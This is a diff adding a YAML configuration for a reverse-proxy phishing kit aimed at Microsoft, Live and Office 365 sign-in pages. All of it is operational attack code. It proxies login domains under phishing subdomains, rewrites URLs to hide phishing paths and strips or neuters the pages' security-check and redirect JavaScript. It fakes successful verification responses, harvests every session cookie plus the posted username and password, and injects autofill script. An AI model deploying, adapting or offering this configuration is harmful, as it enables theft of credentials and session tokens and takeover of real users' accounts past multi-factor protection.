@@ -1,0 +1,213 @@
+min_ver: '3.2.0'
+redirect_url: 'https://outlook.office.com/mail/'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'fpt', orig_sub: 'fpt', domain: 'live.com', session: true, auto_filter: true}
+  - {phish_sub: 'fpt1', orig_sub: 'fpt', domain: 'microsoft.com', session: true, auto_filter: true}
+  - {phish_sub: 'logon', orig_sub: 'login', domain: 'microsoft.com', session: true, auto_filter: true}
+  - {phish_sub: 'logon2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, auto_filter: true}
+  - {phish_sub: 'msauth', orig_sub: '*', domain: 'msauth.net', session: true, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, auto_filter:true}
+  - {phish_sub: 'browser', orig_sub: 'browser', domain: 'events.data.microsoft.com', session: true, auto_filter: true}
+
+# PRO 4.2 Feature: URL Rewriting
+# Hides typical phishing paths behind generic, legitimate-looking paths
+rewrite_urls:
+  # Map public '/common/oauth2/authorize' to internal '/' login path
+  - trigger:
+      domains: ["login.live.com"]
+      paths: ["^/common/oauth2/authorize.*"]
+    rewrite:
+      path: "/"
+      # Query params are preserved by default unless excluded
+      # We don't need to explicitly map client_id unless changing it
+      exclude_keys: ["debug", "trace"]
+
+sub_filters:
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: 'function\\s+(getRedirect|getSecurity|getAuth|getCheck|getVerify)'
+    replace: '// SECURITY DISABLED: function $& {}'
+    mimes: ['application/javascript']
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: '(top|parent|window|location)\\.href\\s*=\\s*["'']?([^"'']*microsoft[^"'']*)["'']?'
+    replace: 'console.log("🚫 REDIRECT BLOCKED:", $2);'
+    mimes: ['application/javascript']
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: '\\/s\\/[a-f0-9]{40,64}'
+    replace: '/blocked-security-check'
+    mimes: ['*/*']
+  # Force redirect to /landingv2 instead of disabling it
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'login.microsoft.com'
+    orig_sub: 'login'
+    domain: 'microsoft.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'www.office.com'
+    orig_sub: 'www'
+    domain: 'office.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'account.microsoft.com'
+    orig_sub: 'account'
+    domain: 'microsoft.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'login.live.com'
+    orig_sub: 'browser'
+    domain: 'events.data.microsoft.com'
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+
+intercept:
+  - domain: 'login.live.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'live.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'microsoft.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'microsoftonline.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'account.microsoftonline.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'office.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"success": true}'
+    mime: 'application/json'
+  - domain: 'account.live.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"success": true}'
+    mime: 'application/json'
+  - domain: '.*'
+    path: '.*(/s/|check|verify).*'
+    http_status: 200
+    body: '{"success": true, "valid": true, "authenticated": true}'
+    mime: 'application/json'
+  - domain: 'browser.events.data.microsoft.com'
+    path: '.*'
+    http_status: 200
+    body: ''
+    mime: 'text/plain'
+
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: 'live.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: 'microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'account.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.account.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.clarity.ms'
+    keys: ['.*:regexp']
+  - domain: 'clarity.ms'
+    keys: ['.*:regexp']
+  - domain: 'login.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: 'account.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.clarity.ms'
+    keys: ['.*:regexp']
+  - domain: '.account.microsoft.com'
+    keys: ['.*:regexp']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/landingv2'
+
+login:
+  domain: 'login.live.com'
+  path: '/'
+
+# PRO 4.2 Feature: Advanced JS Injection
+js_inject:
+  # 1. Bot Detection Bypass (Head injection)
+  # Injected early to overwrite browser fingerprints if needed
+  # DISABLED: Suspected cause of "Retry with different device" block
+  # - trigger_domains: ["login.live.com"]
+  #   trigger_paths: ["/"]
+  #   location: "head"
+  #   script: |
+  #     // Anti-Bot: Mock common WebDriver properties
+  #     Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+  #     console.log('Anti-Bot protection initialized');
+
+  # 2. Autofill (Body injection)
+  - trigger_domains: ["login.live.com"]
+    trigger_paths: ["/"]
+    location: "body_bottom"
+    trigger_params: ["username"]
+    script: |
+      document.addEventListener('DOMContentLoaded', function() {
+        var u = document.querySelector('input[name="loginfmt"]');
+        if (u && "{username}") u.value = "{username}";
+      });
